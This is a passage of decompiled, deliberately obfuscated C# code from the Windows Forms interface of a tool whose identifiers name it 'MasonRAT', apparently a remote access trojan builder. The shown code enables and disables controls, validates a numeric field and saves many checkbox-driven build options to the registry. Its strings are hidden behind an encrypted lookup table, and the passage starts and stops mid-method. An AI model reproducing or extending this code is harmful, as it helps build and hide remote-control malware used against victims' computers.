      this.\u2694️MasonRAT\u270C̍ﯧـڙ\u0609ڕڙ\u060Dـ\u060Dـ\u060Cــﯧ\u060B\u0609.Enabled = true;
    else
      this.\u2694️MasonRAT\u270C̍ﯧـڙ\u0609ڕڙ\u060Dـ\u060Dـ\u060Cــﯧ\u060B\u0609.Enabled = false;
  }

  private void \u2694️MasonRAT\u270Cـ\u0020ڞڙۙۏٻـټـ\u0608ٺــٻژ̍\u060B\u0020\u0609(
    object sender,
    EventArgs e)
  {
    try
    {
      Conversions.ToInteger(this.\u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B.Text);
      if (Conversions.ToInteger(this.\u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B.Text) > (1380535846 + -1039234911 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 > (1159001782 + (571774260 << 1927034728) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) ? 2039062252 - 2038974874 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 : 25010710 - (1596491327 >> 123825510) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1) | Conversions.ToInteger(this.\u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B.Text) < 1)
        this.\u2694️MasonRAT\u270Cمۙڙڙۙـﻻٸ\u060Eڅ\u060D.Enabled = false;
      else
        this.\u2694️MasonRAT\u270Cمۙڙڙۙـﻻٸ\u060Eڅ\u060D.Enabled = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.\u2694️MasonRAT\u270Cمۙڙڙۙـﻻٸ\u060Eڅ\u060D.Enabled = false;
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـــ\u060Cــــ\u060Fڠּـ\u0608ڠ\u0608ٺ(
    object sender,
    MouseEventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٽ\u060Aژ\u060Aڝٺ\u060A\u0608ۙـ\u060Aۏٸــۧ\u0609\u0609.Checked)
    {
      this.\u2694️MasonRAT\u270C\u060Aـ\u060Dـءټ\u060Aــ\u0609؁ـ\u060A\u060Fـ̍ټ\u060E.Enabled = false;
      this.\u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B.Enabled = false;
      this.\u2694️MasonRAT\u270Cۙ\u0609ـ\u060Aــ\u0608\u060Dـ\u0020̍\u060A\u060Aـ.Enabled = false;
      this.\u2694️MasonRAT\u270Cط\u060Aٽــمڕـڙــ\u060Dٽـط\u0609ــۜ\u060D.Enabled = true;
    }
    else
    {
      this.\u2694️MasonRAT\u270C\u060Aـ\u060Dـءټ\u060Aــ\u0609؁ـ\u060A\u060Fـ̍ټ\u060E.Enabled = true;
      this.\u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B.Enabled = true;
      this.\u2694️MasonRAT\u270Cۙ\u0609ـ\u060Aــ\u0608\u060Dـ\u0020̍\u060A\u060Aـ.Enabled = true;
      this.\u2694️MasonRAT\u270Cط\u060Aٽــمڕـڙــ\u060Dٽـط\u0609ــۜ\u060D.Enabled = false;
    }
  }

  private void \u2694️MasonRAT\u270C\u0020ـ\u060A\u0020̍ڕۚڅـةبٺڅڇئڙـٺ\u0609ـ(
    object sender,
    EventArgs e)
  {
    try
    {
      SaveFileDialog saveFileDialog1 = new SaveFileDialog();
      saveFileDialog1.Filter = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1715);
      saveFileDialog1.OverwritePrompt = false;
      saveFileDialog1.FileName = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1716);
      SaveFileDialog saveFileDialog2 = saveFileDialog1;
      if (saveFileDialog2.ShowDialog() != DialogResult.OK)
        return;
      try
      {
        MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1717), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1718), (object) this.\u2694️MasonRAT\u270C\u060Aـ\u060Dـءټ\u060Aــ\u0609؁ـ\u060A\u060Fـ̍ټ\u060E.Text);
        MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1719), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1720), (object) this.\u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B.Text);
        MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1721), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1722), (object) this.\u2694️MasonRAT\u270Cۙ\u0609ـ\u060Aــ\u0608\u060Dـ\u0020̍\u060A\u060Aـ.Text);
        MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1723), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1724), (object) this.\u2694️MasonRAT\u270C̍ﯧـڙ\u0609ڕڙ\u060Dـ\u060Dـ\u060Cــﯧ\u060B\u0609.Text);
        MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1725), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1726), (object) this.\u2694️MasonRAT\u270Cط\u060Aٽــمڕـڙــ\u060Dٽـط\u0609ــۜ\u060D.Text);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (this.\u2694️MasonRAT\u270C\u0608\u060Cـحڠٺ\u060A\u060Aـٺ\u060Aڙح\u0609ؤ.Checked)
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1727), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1728), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1729));
        else
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1730), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1731), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1732));
        if (this.\u2694️MasonRAT\u270Cـ̍ﮪ\u060Cـ\u060B\u0608ــ\u0609\u0609ۙ̍\u060B\u0609\u0609دة.Checked)
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1733), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1734), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1735));
        else
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1736), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1737), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1738));
        if (this.\u2694️MasonRAT\u270Cٺڣٺ\u060Fٺ\u0609̍\u060B\u060Eۨ\u060Dڕ.Checked)
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1739), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1740), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1741));
        else
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1742), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1743), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1744));
        if (this.\u2694️MasonRAT\u270Cٽـټ\u060A\u0020ٸـ\u060E\u0608ـۡــ̍\u060D.Checked)
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1745), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1746), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1747));
        else
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1748), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1749), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1750));
        if (this.\u2694️MasonRAT\u270Cٽـڅـڦ\u0609ﯧد\u060F\u060Bــۙـٺ\u060Bاـ.Checked)
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1751), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1752), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1753));
        else
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1754), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1755), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1756));
        if (Operators.CompareString(this.\u2694️MasonRAT\u270C\u060Cــ\u060Dـٽ\u0609ۛ\u060E\u060C\u060Aْـــگ\u060D\u060C\u0608\u0609, (string) null, false) == 0)
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1757), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1758), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1759));
        else
          MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.SetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1760), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1761), (object) this.\u2694️MasonRAT\u270C\u060Cــ\u060Dـٽ\u0609ۛ\u060E\u060C\u060Aْـــگ\u060D\u060C\u0608\u0609);
        if (Operators.CompareString(this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ, (string) null, false) == 0)
